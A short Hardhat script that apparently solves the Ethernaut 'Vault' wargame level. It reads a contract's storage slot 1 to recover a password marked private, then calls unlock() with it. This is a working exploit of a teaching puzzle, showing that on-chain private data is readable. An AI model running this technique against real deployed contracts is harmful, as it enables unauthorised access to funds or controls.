const { web3 } = require("hardhat");
const hre = require("hardhat");

async function main() {
  const contractAddr = "0x405dB8aC43fFB8f30f9BE440187e702D724Cc680";

  const Vault = await ethers.getContractFactory("Vault");
  const vault = await Vault.attach(contractAddr);

  console.log("Locked:", await vault.locked());

  const password = await web3.eth.getStorageAt(contractAddr, 1);

  console.log("Password:", password);
  console.log("Getting password stored as private instance variable...");

  await vault.unlock(password);

  console.log("Locked:", await vault.locked());
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
